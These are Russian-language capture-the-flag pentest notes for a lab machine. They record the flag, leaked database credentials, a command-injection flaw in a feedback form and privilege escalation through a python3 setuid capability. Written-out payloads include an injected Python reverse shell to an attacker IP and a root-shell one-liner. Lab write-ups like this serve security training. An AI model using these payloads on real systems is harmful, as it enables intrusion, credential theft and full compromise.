## LOOT: GreenEdge Pentest
## 23.10.2025 | Обновлено: 24.10.2025

---

## Флаги

**Полный флаг**: `CODEBY{FR0M_F33DB4CK_70_R007_1337}`

**Компоненты**:
- **First Part**: `CODEBY{FR0M_F33DB4CK` (из `/home/charley/first_part`)
- **Last Part**: `_70_R007_1337}` (из `/root/last_part`)

## Учетные данные

**Обнаруженные пользователи**:

- `charley` - пользователь системы
- `www-data` - веб-сервер
- `root` - получен через эскалацию

**База данных (из `config.php`)**:

```php
$DB_HOST = 'localhost'
$DB_USER = 'root'
$DB_PASS = 'SuperSecret123'  
$DB_NAME = 'internal_data'
```

**Проверенные векторы**:

- SSH root: пароль не подошел
- SU root: пароль не подошел
- MySQL: сервис отсутствует
- Риск: повторное использование в других системах

## Ключевые находки

### Уязвимости:

1. **RCE через форму Feedback**
	- Вектор: `*; [command]`
	- Позволил выполнять произвольные команды
2. **Privilege Escalation через Python3 Capabilities**
	- Файл: `/usr/bin/python3.10`
	- Capability: `cap_setuid+ep`
	- Эксплойт: `os.setuid(0)`
3. **Утечка конфиденциальных данных**
	- Файл: `/var/www/html/config.php`
	- Открытые учетные данные БД
	- Риск горизонтального перемещения

### Критические файлы

- `/home/charley/first_part` - первая часть флага
- `/root/last_part` - вторая часть флага
- `config.php` - учетные данные БД

---

## Сетевая информация

**Целевая машина**:

- IP: 192.168.2.219
- Порт: 80 (HTTP), 22 (SSH)

**Атакующая машина**:

- IP: 192.168.124.79
- Порт: 9901 (Reverse Shell)

---

## Эксплойты

### Reverse Shell:

```bash
*; export RHOST="192.168.124.79";export RPORT=9901;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

### Privilege Escalation:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Статус

- Initial Access
- Privilege Escalation
- Флаг получен
- Полная компрометация системы
- Утечка конфиденциальных данных

**Время выполнения: ~1 час